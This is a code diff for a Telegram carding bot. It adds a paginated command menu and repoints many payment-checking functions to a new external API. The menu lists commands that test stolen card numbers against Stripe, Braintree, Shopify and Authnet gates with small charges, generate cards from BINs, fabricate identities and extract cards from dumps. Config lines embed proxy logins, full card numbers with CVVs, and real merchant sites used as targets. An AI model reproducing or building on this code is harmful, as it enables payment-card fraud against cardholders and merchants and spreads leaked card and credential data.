@@ -1075,71 +1075,118 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-from telegram import Update
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ParseMode
-from telegram.ext import ContextTypes
+from telegram.ext import ContextTypes, CallbackQueryHandler, CommandHandler
 
 BULLET_GROUP_LINK = "https://t.me/CARDER33"
+bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
+# List of command pages
+COMMAND_PAGES = [
+    {
+        "title": "𝗦𝘁𝗿𝗶𝗽𝗲",
+        "commands": [
+            "/chk cc|mm|yy|cvv – Single Stripe Auth",
+            "/st cc|mm|yy|cvv – Stripe 1$",
+            "/st1 cc|mm|yy|cvv – Stripe 3$",
+            "/mass – Mass x30 Stripe Auth 2"
+        ]
+    },
+    {
+        "title": "𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲",
+        "commands": [
+            "/b3 cc|mm|yy|cvv – Braintree Premium Auth",
+            "/vbv cc|mm|yy|cvv – 3DS Lookup"
+        ]
+    },
+    {
+        "title": "𝗦𝗵𝗼𝗽𝗶𝗳𝘆",
+        "commands": [
+            "/sh – Shopify Charge $0.98",
+            "/hc – Shopify Charge $10",
+            "/seturl <site url> – Set your Shopify site",
+            "/sp – Auto check on your saved Shopify site",
+            "/msp – Mass Shopify Charged",
+            "/site <url> – Check if Shopify site is live",
+            "/msite <urls> – Mass Shopify site check",
+            "/mysites – Check your added sites",
+            "/adurls <site url> – Set 20 Shopify sites",
+            "/removeall – Remove all added sites",
+            "/rmsite – Remove specific sites from added"
+        ]
+    },
+    {
+        "title": "𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿𝘀",
+        "commands": [
+            "/gen [bin] [no. of cards] – Generate cards from BIN",
+            "/gate site url – Payment Gateway Checker",
+            "/bin <bin> – BIN lookup (Bank, Country, Type)",
+            "/fk <country> – Fake identity generator",
+            "/fl <dump> – Extract CCs from dumps",
+            "/open – Extract cards from uploaded file"
+        ]
+    },
+    {
+        "title": "𝗦𝘆𝘀𝘁𝗲𝗺 & 𝗨𝘀𝗲𝗿",
+        "commands": [
+            "/start – Welcome message",
+            "/cmds – Show all commands",
+            "/status – Bot system status",
+            "/credits – Check your remaining credits",
+            "/info – Show your user info"
+        ]
+    }
+]
+
+def build_page_text(page_index: int) -> str:
+    page = COMMAND_PAGES[page_index]
+    commands_text = "\n".join(f"{bullet_link} <code>{cmd}</code>" for cmd in page["commands"])
+    return f"━━━[ 👇 <b>{page['title']} Commands</b> ]━━━⬣\n\n{commands_text}"
+
+def build_buttons(page_index: int) -> InlineKeyboardMarkup:
+    buttons = []
+    if page_index > 0:
+        buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=f"page_{page_index-1}"))
+    if page_index < len(COMMAND_PAGES) - 1:
+        buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"page_{page_index+1}"))
+    buttons.append(InlineKeyboardButton("❌ Close", callback_data="close"))
+    return InlineKeyboardMarkup([buttons])
+
+# /cmds command
 async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Shows the bot's full commands menu with categories in HTML mode."""
-
-    bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
-
-    cmds_message = (
-        "━━━[ 👇 <b>𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗠𝗲𝗻𝘂</b> ]━━━⬣\n\n"
-
-        "🔹 <b>𝙎𝙩𝙧𝙞𝙥𝙚</b>\n"
-        f"{bullet_link} <code>/chk cc|mm|yy|cvv</code> – Single Stripe Auth\n"
-        f"{bullet_link} <code>/st cc|mm|yy|cvv</code> – Stripe 1$\n"
-        f"{bullet_link} <code>/st1 cc|mm|yy|cvv</code> – Stripe 3$\n"
-        f"{bullet_link} <code>/mass</code> – Mass x30 Stripe Auth 2\n\n"
-
-        "🔹 <b>𝘽𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲</b>\n"
-        f"{bullet_link} <code>/b3 cc|mm|yy|cvv</code> – Braintree Premium Auth\n"
-        f"{bullet_link} <code>/vbv cc|mm|yy|cvv</code> – 3DS Lookup\n\n"
-
-        "🔹 <b>𝙊𝗰𝗲𝗮𝗻 𝙋𝗮𝘆𝗺𝗲𝗻𝘁𝘀</b>\n"
-        f"{bullet_link} <code>/oc cc|mm|yy|cvv</code> – Ocean Payments 4$\n"
-
-        "🔹 <b>𝗔𝘂𝘁𝗵𝗻𝗲𝘁</b>\n"
-        f"{bullet_link} <code>/at cc|mm|yy|cvv</code> – Authnet 1.0$ Charge\n\n"
-
-        "🔹 <b>𝙎𝙝𝙤𝙥𝙞𝙛𝙮</b>\n"
-        f"{bullet_link} <code>/sh</code> – Shopify Charge $0.98\n"
-        f"{bullet_link} <code>/hc</code> – Shopify Charge $10\n"
-        f"{bullet_link} <code>/seturl &lt;site url&gt;</code> – Set your Shopify site\n"
-        f"{bullet_link} <code>/sp</code> – Auto check on your saved Shopify site\n"
-        f"{bullet_link} <code>/msp</code> – Mass Shopify Charged\n"
-        f"{bullet_link} <code>/site &lt;url&gt;</code> – Check if Shopify site is live\n"
-        f"{bullet_link} <code>/msite &lt;urls&gt;</code> – Mass Shopify site check\n"
-        f"{bullet_link} <code>/mysites</code> – Check your added sites\n"
-        f"{bullet_link} <code>/adurls &lt;site url&gt;</code> – Set 20 Shopify sites\n"
-        f"{bullet_link} <code>/removeall</code> – Remove all added sites\n"
-        f"{bullet_link} <code>/rmsite</code> – Remove specific sites from added\n\n"
-
-        "🔹 <b>𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙤𝙧𝙨</b>\n"
-        f"{bullet_link} <code>/gen [bin] [no. of cards]</code> – Generate cards from BIN\n"
-        f"{bullet_link} <code>/gate site url</code> – Payment Gateway Checker\n"
-        f"{bullet_link} <code>/bin &lt;bin&gt;</code> – BIN lookup (Bank, Country, Type)\n"
-        f"{bullet_link} <code>/fk &lt;country&gt;</code> – Fake identity generator\n"
-        f"{bullet_link} <code>/fl &lt;dump&gt;</code> – Extract CCs from dumps\n"
-        f"{bullet_link} <code>/open</code> – Extract cards from uploaded file\n\n"
-
-        "🔹 <b>𝙎𝙮𝙨𝙩𝙚𝙢 & 𝙐𝙨𝙚𝙧</b>\n"
-        f"{bullet_link} <code>/start</code> – Welcome message\n"
-        f"{bullet_link} <code>/cmds</code> – Show all commands\n"
-        f"{bullet_link} <code>/status</code> – Bot system status\n"
-        f"{bullet_link} <code>/credits</code> – Check your remaining credits\n"
-        f"{bullet_link} <code>/info</code> – Show your user info\n"
-    )
-
-    await update.effective_message.reply_text(
-        cmds_message,
+    text = build_page_text(0)
+    buttons = build_buttons(0)
+    await update.message.reply_text(
+        text,
         parse_mode=ParseMode.HTML,
-        disable_web_page_preview=True
+        disable_web_page_preview=True,
+        reply_markup=buttons
     )
 
+# Callback query handler
+async def cmds_pagination(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+
+    if data == "close":
+        await query.message.delete()
+        return
+
+    if data.startswith("page_"):
+        page_index = int(data.split("_")[1])
+        text = build_page_text(page_index)
+        buttons = build_buttons(page_index)
+        await query.message.edit_text(
+            text,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True,
+            reply_markup=buttons
+        )
+
+# Add these handlers to your application
+pagination_handler = CallbackQueryHandler(cmds_pagination, pattern="^(page_|close)$")
 
 
 
@@ -2081,7 +2128,7 @@ async def process_st(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://autoshopify-dark.sevalla.app/index.php"
+            f"https://shopify.stormx.pw/index.php"
             f"?site=https://jovs.com"
             f"&cc={full_card}"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -2659,7 +2706,7 @@ logger = logging.getLogger(__name__)
 
 import urllib.parse
 
-AUTOSH_BASE = "https://autoshopify-dark.sevalla.app/index.php"
+AUTOSH_BASE = "https://shopify.stormx.pw/index.php"
 DEFAULT_PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
 
 async def changeshsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2966,7 +3013,7 @@ logger = logging.getLogger(__name__)
 # --- HC Processor ---
 import urllib.parse
 
-AUTOSH_BASE = "https://autoshopify-dark.sevalla.app/index.php"
+AUTOSH_BASE = "https://shopify.stormx.pw/index.php"
 HC_PROXY = "198.23.239.134:6540:fvbysspi:bsbh3trstb1c"
 
 async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
@@ -3212,7 +3259,7 @@ logger = logging.getLogger(__name__)
 # --- HC Processor ---
 import urllib.parse
 
-AUTOSH_BASE = "https://autoshopify-dark.sevalla.app/index.php"
+AUTOSH_BASE = "https://shopify.stormx.pw/index.php"
 ST1_PROXY = "45.38.107.97:6014:fvbysspi:bsbh3trstb1c"
 ST1_SITE = "https://vasileandpavel.com"
 
@@ -3505,7 +3552,7 @@ async def process_oc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- API request ---
         api_url = (
-            f"https://autoshopify-dark.sevalla.app/index.php"
+            f"https://shopify.stormx.pw/index.php"
             f"?site=https://arabellahair.com"
             f"&cc={full_card}"
             f"&gateway=ocean"
@@ -3705,7 +3752,7 @@ from bin import get_bin_info
 logger = logging.getLogger(__name__)
 
 # --- Config ---
-AUTOSH_AT_API = "https://autoshopify-dark.sevalla.app/index.php"
+AUTOSH_AT_API = "https://shopify.stormx.pw/index.php"
 DEFAULT_PROXY = "64.137.96.74:6641:fvbysspi:bsbh3trstb1c"
 AUTHNET_DEFAULT_SITE = "https://upperlimitsupplements.com"
 
@@ -3963,7 +4010,7 @@ from bin import get_bin_info
 logger = logging.getLogger(__name__)
 
 # --- Config ---
-AUTOSH_AT_API = "https://autoshopify-dark.sevalla.app/index.php"
+AUTOSH_AT_API = "https://shopify.stormx.pw/index.php"
 DEFAULT_PROXY = "64.137.96.74:6641:fvbysspi:bsbh3trstb1c"
 AUTHNET_DEFAULT_SITE = "https://store.wikimedia.org"
 
@@ -4264,7 +4311,7 @@ from bin import get_bin_info
 logger = logging.getLogger(__name__)
 
 # --- Config ---
-ADYEN_API = "https://autoshopify-dark.sevalla.app/index.php"
+ADYEN_API = "https://shopify.stormx.pw/index.php"
 DEFAULT_PROXY = "154.203.43.247:5536:fvbysspi:bsbh3trstb1c"
 ADYEN_DEFAULT_SITE = "https://pizazzhair.com"
 
@@ -4518,7 +4565,7 @@ async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
     """
     # --- API setup ---
     api_url = (
-        "https://autoshopify-dark.sevalla.app/index.php"
+        "https://shopify.stormx.pw/index.php"
         f"?site={site_input}"
         f"&cc={cc_input}"
         "&proxy=84.247.60.125:6095:fvbysspi:bsbh3trstb1c"
@@ -4678,7 +4725,7 @@ async def consume_credit(user_id: int) -> bool:
 
 # ===== API template =====
 API_CHECK_TEMPLATE = (
-    "https://autoshopify-dark.sevalla.app/index.php"
+    "https://shopify.stormx.pw/index.php"
     "?site={site}"
     "&cc={card}"
     "&proxy=216.10.27.159:6837:fvbysspi:bsbh3trstb1c"
@@ -4913,7 +4960,7 @@ last_site_usage = {}
 
 # ===== Updated API template =====
 API_TEMPLATE = (
-    "https://autoshopify-dark.sevalla.app/index.php"
+    "https://shopify.stormx.pw/index.php"
     "?site={site_url}"
     "&cc=4312311807552605|08|2031|631"
     "&proxy=142.111.67.146:5611:fvbysspi:bsbh3trstb1c"
@@ -5059,7 +5106,7 @@ from telegram.error import TelegramError
 from db import get_user, update_user
 
 API_TEMPLATE = (
-    "https://autoshopify-dark.sevalla.app/index.php"
+    "https://shopify.stormx.pw/index.php"
     "?site={site_url}&cc=5547300001996183|11|2028|197"
 )
 
@@ -5500,7 +5547,7 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await consume_credit(user_id):
         return await update.message.reply_text("❌ You have no credits left.")
 
-    base_url = user_data.get("base_url", "https://autoshopify-dark.sevalla.app/index.php")
+    base_url = user_data.get("base_url", "https://shopify.stormx.pw/index.php")
     sites = user_data.get("custom_urls", [])
     if not sites:
         return await update.message.reply_text("❌ No sites found in your account.")
@@ -7500,6 +7547,7 @@ def register_commands(application):
 
     for cmd_name, cmd_func in commands:
         add_dual_command(application, cmd_name, cmd_func, restricted_wrap=True, owner_only=False)
+        application.add_handler(CallbackQueryHandler(cmds_pagination, pattern="^(page_|close)$"))
 
 # 🎯 MAIN ENTRY POINT
 def main():
